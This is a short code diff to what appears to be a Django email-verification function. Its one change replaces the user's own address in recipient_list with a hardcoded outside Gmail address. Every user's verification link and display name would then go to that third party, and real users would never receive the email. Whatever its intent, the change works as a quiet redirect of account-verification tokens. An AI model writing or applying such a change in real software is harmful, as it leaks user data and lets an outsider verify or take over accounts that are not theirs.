@@ -38,7 +38,7 @@ def send_verification_email(user, request):
         subject="Verify your email",
         message=f"Hi {user.display_name}, click the link to verify your email: {verification_link}",
         from_email=settings.DEFAULT_FROM_EMAIL,
-        recipient_list=[user.email],
+        recipient_list=["lohmanbishop@gmail.com"],
     )
 
 def get_user_transactions_for_groups(user, group_uuid_list):
